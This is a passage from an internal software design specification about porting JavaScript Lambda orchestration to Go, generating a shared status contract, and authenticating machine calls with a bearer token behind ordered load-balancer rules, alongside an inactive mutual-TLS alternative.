| ~~**Go + a generated JS/TS artifact**~~ — **THIS IS THE ADOPTED DESIGN (§0.9.2)** | ~~Adds a codegen step to two toolchains that have none, to emit something that is a list of string constants. Over-built.~~ **Wrong on both counts.** The artifact is not "a list of string constants" — it carries the set memberships and the transition table, which is exactly the content that must not diverge. And the codegen step is one `go run` target plus one CI check, which is cheaper than any mechanism that permits Go and the browser to disagree at all. |
| **An API call so the browser stops importing backend code** | A network round trip, a cache-invalidation question and a failure mode, for data that changes when someone edits a source file. **Worse than what exists.** |
| **Duplication plus a conformance test** | Two hand-maintained copies. The conformance test is the mitigation, and this spec has already documented what happens when a declared contract and its implementation are separate artifacts — `saveLearnedPattern` has been non-functional in shipped code through two releases (§A.5.0a). |

> **Take a fourth: the constants become authored data, not code. `context/contracts/sdlc/statuses.json`.**
>
> - **Go** `go:embed`s it — no build step, no codegen.
> - **The frontend imports it directly** — Vite handles JSON natively, so `import statuses from '@contracts/sdlc/statuses.json'` replaces the alias-into-`backend/` hack with something *less* surprising than the status quo.
> - **The JS `cycleStatuses.js` is deleted** when its last Lambda consumer ports — a permitted deletion.
>
> One file, two runtimes, no duplication, no codegen, no network call.

**⚠ Superseded by §0.9.2**, which settles this as **Go canonical plus one generated JS artifact** rather than authored JSON. The problem statement above stands; the resolution below does not. **Do not create `statuses.json`, `transitions.json`, `progress-fields.json` or `stage-map.json`** — the canonical definitions are Go, and the browser artifact is generated from them with a CI drift check.

**It unblocks Phase 4b — via §0.9.2's generation, and the file names below are wrong.** 4b's first edit was to `cycleStatuses.js`, one of the dual-consumed files. Under §0.9.2 the constant is added to **`backend/go/internal/orchestrator/cyclestatus/cyclestatus.go`** and the edge to **`transitions.go`**, then the browser artifact is regenerated. **Not `statuses.json`, not `transitions.json`** — those are the authored-JSON names this subsection proposed and §0.8.4 explicitly forbids creating. An implementer read this paragraph and the prohibition four lines above it and had to guess; the Go files are the answer.

#### 0.8.14 New blocking questions the mandate creates

**~~OQ-G1 — `cc_cycles.py`~~ — RESOLVED BY CONSTRAINT, and it changed the design for the better.**

**`backend/lambda_handlers/sherpa/tools/cc_cycles.py` must not be touched.** Not ported, not patched, not given a selector. **Treat the entire Python Sherpa agent toolset as read-only surface to design around.**

Why the constraint is right, and it is not merely an exemption: `backend/lambda_handlers/sherpa/` is three **Python 3.12 / arm64** Lambdas (`sherpa_agent`, `sherpa_chat`, `sherpa_slack`, `infrastructure/sherpa.tf:123+`) built on the **Strands Agents** framework and attached to an AWS-published **Python-only** layer (`arn:…:layer:strands-agents-py3_12-aarch64:2`). `cc_cycles.py` is a `@tool` module in that agent's toolset. **There is no Go equivalent of Strands**, so "porting" would mean rewriting three agent Lambdas without the framework they are built on. The mandate's evident target is the JS orchestration layer — its stated motivation is the ESM/CommonJS time bomb (migration plan, Context), which is a JavaScript problem Python does not have.

**The consequence is the important part: it invalidated the reader-side fix and forced a better one.** An earlier revision's Task 0.5 patched three *readers* to merge both progress fields. With one reader off-limits that is not a fix at all — a legacy-only cycle would still report no progress in the operator-facing MCP tool. **So the defect is solved at the write path instead (§0.8.12), which fixes every reader without modifying any of them, including the Python one and the frontend.**

**Still requiring a CTO-level ruling, but off the critical path:** whether the Python Sherpa agents are permanently exempt from the Go mandate, or eventually in scope for a rewrite. **Nothing in this spec depends on the answer** — §0.9.2 establishes that Python consumes the contract's *data* and never its *definitions* (status is an opaque pass-through at `cc_cycles.py:46`/`:86`; `progressLog` is read directly at `:99`), so no artifact is generated for it and no edit is needed. That exemption is **conditional on it staying a pass-through**: a single branch on a status value re-enters the contract and lapses it.

**OQ-G2 — how far does the instruction-composition port reach?** Task 2.7 composes `instructions` from `agentBootstrap.js` (137 lines), `agentMemory.js` (223), `agentSkills.js` (132) and `knowledgeBaseLoader.js` (593) — **1,085 lines of JS Lambda modules**, none of which has a Go equivalent, and `knowledgeBaseLoader.js` has 17 out-of-scope callers the architecture doc explicitly protects. Porting all four is a substantial project in its own right; the migration plan places them at Wave 4 (AI Agents). **Recommended default: port only what the SDLC path needs, behind a narrow Go interface, and leave the JS modules in place for their other callers** — accepting one bounded dual implementation with a contract-data guard. **Cost of guessing wrong:** if the whole set must port first, Phase 2 is gated on Wave 4.

**OQ-G3 — can the dispatch seam be built at all without porting the orchestrator?** Task 2.8 needs `agentDrivenOrchestrator/index.js`'s `buildMode: 'runtime'` branch to invoke the Go handler. **Any version of that is an in-place JS Lambda edit.** Options: (a) port the orchestrator first, which is migration-plan Wave 5 and inverts its risk ordering; (b) express the branch without code — e.g. route the SQS message to the Go handler by changing the **event source mapping's target** in Terraform, so the orchestrator is not edited at all; (c) accept one narrowly-scoped exception. **Recommended default: (b)**, because it is the only option that is both compliant and cheap — and it is architecturally cleaner, since it makes the transport decide the executor rather than an `if` inside a 4,984-line handler. **This needs verification before Phase 2 that the legacy dispatch can be redirected that way**, and it is the single most important unknown the mandate introduces.

---

### 0.9 Decisions closed — authoritative, no further escalation

**Seven decisions, all final. Where this section contradicts anything earlier in the document, this section wins.** Each records what was decided, what it deletes, and what it obliges.

#### 0.9.1 Ingress: a bearer token the runtime verifies, on the existing :443 listener. **Phase 1 collapses.**

**Revision 6 replaces this decision. It was "direct to the ALB on a dedicated mTLS listener on :8443, authenticating with a client certificate"; it is now a bearer token.** The API Gateway front door remains deleted — that part of the earlier reasoning survived — but everything downstream of it is rewritten below, and **Phase 1 is rewritten with it.**

**The orchestrator calls `https://sherpa.<customer_subdomain>/v1/sdlc/*` on the EXISTING port-443 listener, presenting `Authorization: Bearer <token>`. The RUNTIME verifies the token itself. No API Gateway, no `HTTP_PROXY` integration, no M2M client, no VPC attachment, no second listener, no CA, no trust store — and no shared header secret.**

**Who authenticates is the one thing to hold onto.** Under the earlier mTLS design the **ALB** decided: the runtime has no authentication of its own, so `mutual_authentication{verify}` was the only control. Under the token the **runtime** decides — it compares a presented token against a secret in constant time — and **the ALB narrows what can reach it rather than judging it.** Neither arrangement leaves the namespace open; they put the decision in different places, and a reader who confuses the two will misread the priority-6 rule as a security hole.

**Why not the API Gateway front door.** Unchanged, and still right. Option A put **two doors in series, either of which alone sufficed.** A caller needed both a `client_credentials` token *and* the ALB's condition; but the ALB is internet-facing, so **anyone satisfying the ALB condition bypassed the gateway entirely.** A door that can be walked around adds cost and moving parts, not protection.

**Why not a shared header secret.** Unchanged, and still right. An `aws_lb_listener_rule` `http_header` condition takes a **literal** — neither the rule nor any parameter mapping can resolve a Secrets Manager value at request time — so the secret appears in the configuration, in every `terraform plan` output and in state in clear text, and "rotate it" is a config edit plus an apply. **The token has neither property**: rotation is a Secrets Manager write or a `terraform taint`, and the value never reaches a plan output or a workflow log. It is implemented and kept as `sdlc_ingress_mode = "header"` for the record; there is no longer a reason to choose it.

**Deleted outright, and this half of the earlier decision stands:**

| Was | Why it goes |
|---|---|
| **Task 1.1** — mint an M2M client via `apiCredentialManager` | No M2M client in this design |
| **Task 1.2** — the `client_credentials` token probe | Nothing to probe |
| **Task 1.2b** — fix the machine-token classifier | **No consumer.** No machine token is ever issued on this path. **The defect is real — file it separately** (§0.9.1a) |
| **Task 1.3** — API Gateway route + `HTTP_PROXY` integration + parameter mapping | The gateway is gone |
| **BQ1** and architecture doc **U1** | **Moot.** No Cognito token, no authorizer in the path. It was answered YES on 2026-09-24 and §0.4 keeps the evidence as a platform fact for whoever next needs M2M auth |
| `var.sdlc_shared_secret` as the operated mechanism | Superseded by the token. The variant survives as `sdlc_ingress_mode = "header"`, inactive |
| `SDLC_M2M_CLIENT_SECRET_ARN`, `COGNITO_TOKEN_ENDPOINT`, `SDLC_M2M_SCOPE` | No OAuth token to fetch |
| The M2M token cache in `internal/runtimeclient` | **The client is materially simpler**: read one secret, set one header. No OAuth round trip, no `expires_in`, no 50-minute refresh |

##### The shape that shipped — one rule above one unconditional deny, on the listener that already exists

**All of this is behind `var.sdlc_ingress_mode`, which defaults to `"none"`**, and the default is deliberate: every merge to `develop` runs `deploy-testing.yml`, which dispatches `deploy-customer-instance.yml` against the live testing account with a **full untargeted apply**. Anything defaulted on here would reach a live ALB without a human choosing to apply it. Turning a mode on is a `workflow_dispatch` a human performs.

```
                       ┌─ prio 6  /v1/sdlc/* AND `Authorization: Bearer *`  → tg-sherpa
sherpa.<subdomain>:443 ┤  prio 8  /v1/sdlc/*  (no other condition)          → fixed_response 403
   (the EXISTING       │  prio 10 /v1/workspace/auth                        (humans, unchanged)
    listener,          │  prio 20 /v1/workspace/*                           (humans, unchanged)
    untouched)         └─ default authenticate-cognito + forward            (humans, unchanged)
                                                     │
                                       tg-sherpa :3000 → apps/runtime
                                          ACL hook compares the token in constant time
```

Four properties, each of which is the reason a piece of it is shaped that way:

- **Priority 6 must be a LOWER number than the deny at 8, so it is evaluated FIRST.** An ALB evaluates rules in ascending priority and the first match acts; the deny at 8 matches the same paths with no further condition, so an allow at 9 or 10 would never be reached and **every machine request would 403 from a rule that looks correct in the console.**
- **The deny at 8 is UNCONDITIONAL and gated on the ALB, not on the mode**, so it exists in all four modes including `"none"`. The hole it closes belongs to the **:443 listener**, not to any variant: verified live, the :443 default action is `authenticate-cognito` with `OnUnauthenticatedRequest: authenticate` **followed by `forward`**, and rules 10/20 match only `/v1/workspace/*` — so without it an **already-authenticated human browser is forwarded into the machine namespace. A successful request, not a redirect.** Denying unconditionally also means mode switches never create or destroy this rule, so there is no window during a switch in which the namespace is open.
- **Priority 6 carries TWO conditions, which the ALB ANDs: the path AND the header.** The header condition is a **reachability filter, not the authenticator**, and the distinction is load-bearing in both directions. What it buys is precise: a request carrying **no `Authorization` header at all** — which is every browser request, and therefore the entire class the deny was written for — no longer matches rule 6, falls through to 8, and is refused **before it touches the instance**. What it does not buy: deleting it would make **no unauthorised request authorised**; every one still fails the runtime's check.
- **Both path forms, `["/v1/sdlc", "/v1/sdlc/*"]`, on every rule in the file.** An ALB path pattern is a literal match with `*` as a wildcard, so `/v1/sdlc/*` does **not** match a request to exactly `/v1/sdlc`. Omitting the bare form on the deny leaves a hole straight to the :443 default action; omitting it on the forward produces a 403 on one path and success on every other.

**`Bearer *` is admitted even when the token is empty or malformed, and that is correct.** The rule is not validating anything, so admitting `Bearer ` costs nothing — that request reaches the runtime and fails the constant-time comparison one layer later, exactly as a wrong token does. The filter's job is to stop traffic that is not even *shaped* like a machine call. The header **name** matches case-insensitively (so HTTP/2's lowercasing is fine) while the **value** is case-sensitive, which is why the scheme is spelled exactly as the Go client spells it: `bearer *` would match nothing.

**What is genuinely traded, because something is.** The ALB no longer makes the authorisation **decision**, the way `mutual_authentication{verify}` did on 8443. A request that is merely *shaped* correctly reaches the runtime. **So this mode depends on the runtime's half being deployed TO THE INSTANCE, not merely merged** — if the box is not running a build that carries the ACL's token check, or is running one that cannot read the secret, then "shaped like a machine call" is the only test any request faces. The runtime deploy is a manual SSM RunCommand and Terraform can see neither the other repository nor the running instance, so **that ordering is enforced by the human performing the `workflow_dispatch`, and nowhere else.**

##### The credential: generated and written by Terraform, read once at boot

| | |
|---|---|
| Terraform variable | `var.sdlc_ingress_mode` — one of `none` (default), `token`, `mtls`, `header`, with a `validation` block. `infrastructure/sherpa-sdlc-ingress.tf` |
| Generator | `random_password.sdlc_auth_token` — **48 characters, `special = false`.** No punctuation is not cosmetic: the token travels in an HTTP header value and is compared as a string by **two independent implementations**, so excluding the special set removes every question about quoting, shell escaping in the runtime's systemd unit, and header-value encoding. The entropy lost is recovered by the length |
| Secret | `"${var.project_name}/sdlc-auth-token/${var.environment}"`, `recovery_window_in_days = 0` |
| Value shape — **a cross-repository contract** | `{"token": "<opaque string>"}`. An object rather than a bare string so a field can be added later without breaking whichever side is not redeployed first. `jsonencode`, not a heredoc, so a token containing a character needing escaping cannot produce a secret that parses on neither side |
| Env var — **the same name on both sides** | `SDLC_AUTH_TOKEN_ARN`. Command Center's `config.Load` and the runtime's `loadConfig` read the identical name |
| Runtime read | **Once, at boot** (`apps/runtime/src/sdlc/auth-token.ts`). Per request would put a network call and a throttling quota in front of every machine request and make a Secrets Manager outage an outage of the SDLC surface |
| Comparison | **SHA-256 digests, `timingSafeEqual`.** `timingSafeEqual` throws on a length mismatch, so a raw comparison needs a length guard — and that guard is itself an early return on length, which leaks the secret's length to a caller who can time it. Hashing both sides makes every comparison 32 bytes against 32 bytes |

**The ARN is derived from the resource, never restated, and there is deliberately no `var` override for it** — unlike the base URL and the certificate ARN, which both keep one. A variable would exist so an operator could point the Lambdas at a token issued outside this state, which is a human generating and installing a credential by hand: **the step this mode was chosen to avoid.** Deriving it also makes the grant, the environment variable and the output unable to name different secrets, and orders the graph so the secret is created before the functions that read it — **one apply, with no window in which a Lambda points at nothing.**

**Three failures are refused at boot rather than per request**, because boot is the only place they are diagnosable: a secret that is not valid JSON, an object with no non-empty string `token`, and — the non-obvious one — **a token with leading or trailing whitespace**, which an HTTP field value cannot carry, so every request would 403 with nothing in the log to explain it. **The caught JSON error is discarded, not wrapped:** V8's `JSON.parse` messages quote the offending input back, and the offending input here is the secret.

**The token must never be logged** — not the value, not a prefix, not a length, not inside an error. What *is* logged on a refusal is **presence only** (`bearerPresented: true|false`), because whether the header arrived at all is the first question an operator has and it separates "Command Center is not sending it" from "the two sides hold different secrets".

##### mTLS remains implemented and inactive — and it was never infeasible

**`sdlc_ingress_mode = "mtls"` is fully written and reachable**: `aws_lb_trust_store.sherpa_sdlc`, `aws_lb_listener.sherpa_sdlc_mtls` on 8443 with `mutual_authentication{mode = "verify"}`, a priority-5 forward on that listener, a 403 default action, an 8443 ingress rule on the ALB security group, and `aws_secretsmanager_secret.sdlc_client_cert`. The runtime's ACL still accepts a client certificate as an **alternative** credential, so a deployment that has the listener and a leaf keeps working with no token configured at all. **Every one of those resources is `count = 0` in the operated mode.**

**⚠ Do NOT record that mTLS was infeasible, or that it required an unexecutable manual step. Two earlier revisions of this document and two code comments said so, and it is false.** The accurate account, because the false one is the more quotable and will come back otherwise:

- **What is true:** `verify` mode needs CA certificates, and `aws_lb_trust_store` takes exactly two required arguments — `ca_certificates_bundle_s3_bucket` and `ca_certificates_bundle_s3_key` — so a bundle must be in S3 before the trust store can be created.
- **What does NOT follow, and is what the old claim asserted:** that a **human** has to produce it. **AWS Private CA creates and self-signs a root entirely in Terraform with no manual step:** `aws_acmpca_certificate_authority` (`type = "ROOT"`) exposes `certificate_signing_request`, `aws_acmpca_certificate` signs it under the `RootCACertificate/V1` template, `aws_acmpca_certificate_authority_certificate` activates it, and the CA certificate is then a plain attribute an `aws_s3_object` can write to the key above. A client leaf is `tls_private_key` + `tls_cert_request` + `aws_acmpca_certificate`, with the certificate and the key both available as attributes. **The `tls` provider can play the CA instead, for nothing.**
- **So the manual step was OURS, a property of our own Terraform.** The configuration points a trust store at an S3 key that nothing in it writes, and leaves `aws_secretsmanager_secret.sdlc_client_cert` as a container **with no `secret_version`** — both choices, both automatable, neither automated. We declined to pay for ACM Private CA and declined to write the `tls`-provider equivalent.

> **The token is the operated mode because it was CHOSEN over paying that cost. That is a different and much smaller claim than "mTLS could not be switched on", and it is the only one the evidence supports.**

The stated reason for withholding a version from `sdlc_client_cert` — that a version writes a private key into state in clear text — **is not the rule that was followed**, and the inconsistency is recorded rather than dressed up: `aws_secretsmanager_secret_version.sdlc_auth_token` writes a `random_password` into state in clear text, which is the same exposure. What separated them was **cost and effort, not feasibility**. What makes the state exposure acceptable rather than merely convenient is that **state access is already privileged in this repo** — the bucket holds every Lambda's configuration, the table names and the Cognito pool ids, and anyone who can read it can also run an apply. It is an existing boundary being relied on, not a new one being crossed.

##### The trade-off between the two credentials, stated so it can be argued with

Any future argument for or against mTLS here has to be made on **cost and on this trade-off**, not on feasibility:

| | Bearer token (operated) | Client certificate (implemented, inactive) |
|---|---|---|
| **Replay** | **Replayable.** Anyone who obtains it — from a log, a crashed process's memory, an over-broad IAM read — can present it until it is rotated | **Not replayable.** Proves possession of a private key that never crosses the wire |
| **In transit** | TLS-encrypted to the ALB | TLS-encrypted to the ALB. **The difference is what a stolen copy is worth, not whether it can be sniffed** |
| **Rotation** | A Secrets Manager write **plus a restart of both sides**, because the token is read once at boot. Cheaper, but it is a restart | Reissue a leaf from the same CA. The trust store holds only the CA, so a new leaf is accepted with **no ALB change and no apply** |
| **Who decides** | The **runtime**, in constant time. The ALB filters | The **ALB**, before the instance sees the request |
| **Cost to stand up** | A `random_password` and a secret version. Free | ACM Private CA (~$400/month general-purpose, ~$50/month short-lived) **or** the `tls`-provider equivalent, which is free but is code nobody wrote |

**Rotation has a real window and nothing else records it.** Replacing the secret generates a new token and writes a new version in one apply, while the runtime holds the one it read at boot — so a session created under the old token can be served by a runtime holding the new one. **A token-only deployment should rotate while no session is live.**

##### 0.9.1a The machine-token classifier defect stands as a standalone issue

`IsMachineToken` (`middleware/auth.go:20-23`) requires `sub` to be empty; a real `client_credentials` token carries `sub` **equal to** `client_id` (verified live, §0.4). So it returns `false` for every machine token, `HasScope` consequently falls through to `IsAdmin`, and `GetUserID` — **22 Go call sites** — attributes a machine caller as the bare client id instead of `m2m:<client_id>`.

**Nothing in this spec depends on it any more.** File it separately so the finding is not lost with the deleted task.

##### There is no caller identity under the token, and no field can be made to carry one

**This is the consequence of the change that is easiest to miss, and two earlier revisions built on the opposite assumption.** The mTLS design promised the runtime a verified identity for the first time — the ALB injects `X-Amzn-Mtls-Clientcert-Subject`/`-Issuer`/`-Serial-Number`/`-Validity`/`-Leaf` and overwrites anything the client sent, so on **that** path the subject genuinely cannot be forged, and it is still how the retained certificate path works. **Under the operated bearer token there is no such thing.**

**The token is ONE shared secret.** It carries no subject, no client name and no key of its own, so **nothing about the request identifies which caller presented it.** A label like `m2m:command-center` would assert an identity the credential does not prove and would be indistinguishable from the same string written by anyone else who obtained the token. The value the create route passes is therefore `m2m:bearer` — **naming the credential, not a caller** — and it is deliberately not `m2m:unknown`, which already means "we looked at a certificate subject and could not tell" rather than "there was nothing to look at by design".

**And it does not reach the session record at all.** `SessionManager.create` forces `createdBy: this.userId`, so **every SDLC session persists `createdBy: 'dev-user'`** — and **that forcing is correct**, because the field backs a live ownership check in `renameSession` (BQ3a, BQ4, §A.3). **A second machine client that must be told apart gets its own credential, not another field.** The separation this design actually rests on is `application === 'sdlc'`.

§A.3 specifies the ACL, including the one trap that survives on the certificate path: the :443 and :8443 listeners **share a target group**, so the absence of the mTLS headers is the only evidence a request did not come through the mutual-TLS door — which is why presence is **required** on that path rather than merely checked when present.

#### 0.9.2 Source of truth: Go is canonical, with **one** generated artifact — for the browser

**`BQ-GO-1` is closed.** For the cycle statuses *and* the activity-feed contract:

> **The Go definition is canonical. A single JS artifact is generated from it for the browser, and a drift check fails the build if it is stale. There is no Python artifact and no Python generator.**

This supersedes §0.8.6 and §0.8.13, which proposed hand-authored JSON as the shared source. **Generated-from-Go is stricter**: authored JSON still permits a Go implementation that disagrees with the file, whereas generation makes the Go definition the only thing anyone edits.

| Artifact | Home |
|---|---|
| **Canonical** | `backend/go/internal/orchestrator/cyclestatus/` — the constants, the set memberships, the transition table, and the progress-field contract, as Go |
| **Generated for the browser** | a JS/TS module the frontend imports, replacing `frontend/vite.config.js:19`'s alias into `backend/common/` |
| **The generator** | a `go run` target committed in `backend/go/`, plus a **CI step that regenerates and fails on any diff** |
| **Python** | **nothing generated.** See the exemption below |

##### Why Python is exempt — record the reason, not just the omission

**Python consumes the contract's *data*, never its *definitions*.** Verified across all six modules in `backend/lambda_handlers/sherpa/tools/`:

- **Status is passed through as an opaque string.** `cc_cycles.py:46` is `cycle.get("status", "")` and `:86` is `item.get("status", "")`. There are **no status constants anywhere** in those six files and **no branching on a status value** — a grep for the status literals and for equality comparisons against them returns nothing.
- **It reads `progressLog` directly** (`:99`), which §0.9.7's convergence makes the canonical field. So it is **already correct and stays correct** with no change.

A generated Python module would therefore have had nothing to be imported *for* — and worse, importing it would have required editing `cc_cycles.py`, which is untouchable (§0.8.14 OQ-G1). **That was a contradiction in an earlier revision of this decision and it is resolved by deleting the Python half rather than by finding a way around the edit.**

> **The exemption is conditional, and this is the part to record.** It holds only while the Sherpa agent stays a pass-through. **If it ever branches on a status value — a filter, a label, a conditional — it re-enters the contract and the exemption lapses**, at which point the right move is a generated Python artifact, not a hand-written constant. Anyone adding such a branch owns that.

**No hand-maintained duplicate in any language.** `backend/common/cycleStatuses.js` is deleted when its last Lambda consumer ports; until then it is **read-only** and the generated JS artifact is what the frontend consumes.

**Drift-check scope: one artifact.** The CI step regenerates the **JS browser artifact** and fails on any diff against the committed copy. That is the whole check. **It must not look for a Python artifact**, because none exists — a check for a file that is deliberately absent is a check the next person deletes because they cannot work out what it wants.

**The drift check is part of the work, not a follow-up.** A generator without one is a generator someone will forget to run — which is precisely the `saveLearnedPattern` failure mode (§A.5.0a), where a declaration and its implementation were separate artifacts with no test binding them, and the tool has been non-functional in shipped code through two releases.

#### 0.9.3 Shape: a new Go handler for the cycle path

**`DEP-P1-16` is closed.** Not `sdlc-manager` — verified: `internal/sdlc` is preset CRUD (`SDLCTemplate`, `Stage`, `Config`, `PlanningConfig`, `QAConfig`, `handler.go:74-142`), 828 lines including tests, **no cycle record and no status transition**, keyed on `sdlcTemplatesPK = "SDLC_TEMPLATES"`. And no Go handler anywhere owns the cycle path: a grep of `backend/go` for `CYCLE#`/`development_cycle` returns only a test fixture and one incidental hit in `internal/discovery`.

**So: `backend/go/cmd/sdlc-cycle-worker/` plus `backend/go/internal/orchestrator/*`**, following migration-plan Wave 5's own decomposition and seeding it. New code, therefore **no parity obligation** — nothing to be faithful to.

#### 0.9.4 Port granularity: the whole orchestrator handler

**`DEP-P1-17` is closed: port `agentDrivenOrchestrator` whole.** The reason is not preference, it is mechanical — **one Lambda is one artifact with one runtime and one entrypoint** (`aws_lambda_function.agent_orchestrator`, Node, `handler = index.handler`, from `agentDrivenOrchestrator.zip`, `lambdas.tf:1519-1528`). A partial port means a second Lambda, and a second Lambda means a JS/Go boundary inside one logical unit — two deploy artifacts, two error surfaces and a synchronous invoke where a function call used to be, for a handler whose whole job is a state machine over one record.

Port-then-change, parity per §0.9.6's three forms. §0.8.5a's thirteen-step decomposition is the sequence; it stands, and each step is a port commit plus its parity evidence.

#### 0.9.5 The orchestrator is pulled forward, ahead of Wave 5

**This work needs the cycle path in Go now, so the orchestrator port happens here rather than at the migration plan's Wave 5.**

Two things to record about that:

- **Wave 5's sizing is stale.** It budgets *"3,970 lines, 42 functions"*; the handler is **4,984 lines** today — **25% larger** than the plan's estimate, and it has grown while the plan sat. Anyone costing this from the plan will under-budget it.
- **Pulling it forward inverts the plan's stated dependency, and the inversion is the honest description.** Wave 5's rationale is *"depends on patterns proven in Waves 1-4."* Those waves have not run. So **this work proves the patterns rather than consuming them** — it is the first substantial orchestration port, and the golden-record and write-shape parity harnesses it builds become Wave 1–4's tooling rather than inheriting theirs. That is a real cost transferred onto this project and it should be visible in its plan, not discovered.

#### 0.9.6 `mapSessionEvent` is ported, not discarded — and the parity vocabulary aligns with Part 2

**`BQ-GO-2` is closed: port it.** An earlier revision proposed deleting the JS outright on the grounds that it has zero production callers (§0.8.1, which is correct — `require`d at `index.js:42`, never invoked). **Deleting it discards the two landed test suites**, and those suites are the specification: `backend/__tests__/runtimeEvents.test.js` (122 lines) and `applyRuntimeEffect.test.js` (115 lines), shipped in `546408af`/`5eafe042`, encode the real `ServerMessage` shapes against which the mapper was written — including the correction that the ticket's event names were aspirational.

**So: port `mapSessionEvent` and `buildCompletionEffect` to Go, with those two suites translated case-for-case as the parity evidence, and delete the JS only after the Go passes.** The JS tests are an asset, not overhead.

**Parity vocabulary — adopt Part 2's names**, since it aligns to this document and two vocabularies for one concept is its own drift:

| Name | Applies to | How |
|---|---|---|
| **Golden-record parity** | pure functions over a cycle record — the transition table, the step graph, `mapSessionEvent`, payload validators | Capture real cycle records from testing as JSON, run the JS once to record outputs, commit the golden files, assert the Go reproduces them |
| **Write-shape parity** | anything issuing DynamoDB commands — `writeStatus`, `addProgressLog`, the conditional persists | Assert the Go emits the same `UpdateExpression` / `ConditionExpression` / attribute sets. `applyRuntimeEffect.test.js`'s `trackCommandArgs` harness exists to capture these in JS — run it once to record, then assert in Go |
| **Live A/B on testing** | whole-handler ports where neither of the above is tractable — `routeAfterEngineering`'s QA branch, the PR 422 fallbacks | Run one legacy cycle end to end before and after, diff the resulting cycle record field by field |

These replace this document's earlier A/B/C labels. **And Part 2's ordering consequence is adopted: a legacy cycle must pass after each port, before that port's change step lands.**

#### 0.9.7 The progress feed converges on `progressLog`, before the cutover

**Confirmed as specified in §0.8.12.** The reasoning is Part 2's and it is correct: `cc_cycles.py` reads `progressLog` **only** and cannot be touched, so converging on `activities` would blind the one unfixable reader; and `applyRuntimeEffect` already writes `progressLog`, which makes the runtime path canonical by construction.

**Before the cutover, not simultaneous with it** — and that is satisfied almost for free, because the runtime path already writes the winning field. The only reader needing a change is **the frontend** (`CycleProgress.jsx:75`, one line, exempt from the mandate). **No backfill** (§0.8.12 states the cost).

**This imposes no obligation on §0.9.2's generator, and that was checked rather than assumed.** `cc_cycles.py:99` already reads `progressLog`, so convergence makes it correct with no change; and it passes `status` through as an opaque string (`:46`, `:86`) with no constants and no branching anywhere in the six Sherpa tool modules. **So the Python side needs nothing generated at all** — §0.9.2 records the exemption and the condition under which it lapses.

---

## Section A — Shared contracts

**Normative.** Part 2 references these. Two people implementing opposite sides of any boundary here should not be able to diverge. Where a field is optional, that is stated; where a value is an enum, the complete set is given; where an error is possible, the status code and body are given.

Conventions for this section:

- Types are written in TypeScript because the runtime side is TypeScript. The Command Center side is CommonJS JavaScript and must restate them as runtime validation plus a drift guard (§0.0).
- `REQUIRED` / `OPTIONAL` are stated per field. "OPTIONAL" means the sender may omit the key entirely; it does **not** mean `null` is acceptable unless stated.
- Unknown fields are **ignored, never rejected**, in both directions. This is what makes the two repos deployable independently (§0.3).
- All timestamps are ISO-8601 UTC strings with milliseconds (`2026-09-23T14:02:11.441Z`), matching `new Date().toISOString()` which is what every existing write site uses.

### A.1 Where each type lives

| Type | Home | Status today |
|---|---|---|
| `SessionStatus`, `SessionCommand`, `SessionApplication`, `TokenUsage`, `AgentSession`, `SESSION_NAME_MAX_LENGTH` | `sherpa-sdk/packages/protocol/src/session.ts` | exists, **used as-is at 4.0.1**. ~~three additive changes needed (§A.8)~~ — **none were made**; the create route **casts** for `'sdlc'` and `'queued'` is a response-only value (§A.8) |
| `CreateSessionRequest`, `CreateSessionResponse`, `GetSessionResponse`, `HealthResponse` | `sherpa-sdk/packages/protocol/src/api.ts` | exists, **unextended**. `HealthResponse` is reused verbatim; the SDLC request/response supersets are **declared in the runtime** — see the row below |
| `ServerMessage` union | `sherpa-sdk/packages/protocol/src/messages.ts` | exists, **untouched**. ~~one additive variant + one additive field~~ — the `completion` and `sessionEnd` events **bypass this union**, published straight onto the SQS envelope (§A.8) |
| `PauseReason` | `sherpa-sdk/packages/core/src/engine/engine-types.ts:54-63` | exists, complete. ~~needs re-exporting from `protocol`~~ — **restated** as `SESSION_END_REASONS` in the runtime's `sdlc/publisher.ts` and pinned by the driftguard, which avoids a `protocol → core` dependency entirely (§A.8) |
| `SdlcEventEnvelope`, `SdlcEvent`, `SdlcCorrelation`, `SdlcSessionProfile`, `SdlcCreateSessionRequest`/`-Response`, `SdlcErrorResponse` | **`nevado-sherpa-tui/apps/runtime/src/sdlc/contract.ts` and `sdlc/publisher.ts`** — ~~`sherpa-sdk/packages/protocol/src/sdlc.ts`~~ | **In the RUNTIME, not the SDK (revision 6).** These declarations are **the authority, not a mirror**: there is no protocol-package counterpart to drift from. `CompletionPayload`'s authority is the **consumer** — `command-center/backend/go/internal/orchestrator/sdlcevent` |
| CC-side mirror of the above | **new**, `backend/common/sdlcContract.js` | does not exist |

**Why one `sdlc/` directory in the runtime rather than fields spread through `session.ts`** (the argument is unchanged; only the repo is): it keeps the one SDLC-shaped module in the protocol package isolated and greppable, so the boundary claim in architecture doc §1.1 ("the runtime never learns an SDLC concept") stays auditable — the runtime imports *types* from `sdlc.ts` and never reads a `correlation` field's contents. If these types were scattered through `session.ts` that property would be unverifiable.

`SESSION_NAME_MAX_LENGTH = 50` (`session.ts:165`; also `node_modules/@nevadoai/sherpa-protocol/dist/session.d.ts:137` in the installed 4.0.1). `session-utils.ts:151-160` already exports a `validateSessionName` that rejects names over that length — use it rather than reimplementing the check.

### A.2 Inbound HTTP: CC → runtime

#### A.2.0 Ingress

**A bearer token on the existing :443 listener** — see §0.9.1 for why, which supersedes both architecture doc §2.1's Option A recommendation **and this document's earlier mTLS decision.** The path from a CC Lambda to the runtime is one hop:

```
the dispatching Go Lambda (no VPC config — zero vpc_config blocks exist in infrastructure/*.tf)
  1. read the token from Secrets Manager: {"token": "<opaque>"}   [SDLC_AUTH_TOKEN_ARN]
  2. POST https://sherpa.<customer_subdomain>/v1/sdlc/sessions
       Authorization: Bearer <token>        (no client certificate; no port suffix)
     -> the EXISTING :443 listener, untouched — no mutual_authentication anywhere on it
     -> rule priority 6:  path_pattern ["/v1/sdlc", "/v1/sdlc/*"]
                          AND http_header Authorization: ["Bearer *"]
                          -> forward to tg-sherpa
        rule priority 8:  the same paths, NO other condition -> fixed_response 403
                          (unconditional; gated on the ALB, not on the ingress mode)
     -> target group :3000 -> apps/runtime
     -> the /v1/sdlc plugin's ACL hook hashes the presented token and the boot-read one
        and compares them with timingSafeEqual. THIS is the authenticator.
```

**No API Gateway, no `HTTP_PROXY` integration, no Cognito M2M client, no OAuth round trip, no VPC link, no VPC attachment, no second listener, no trust store, and no `X-Amzn-Mtls-Clientcert-*` header on this path.**

Three consequences worth stating, because they change earlier text in this document:

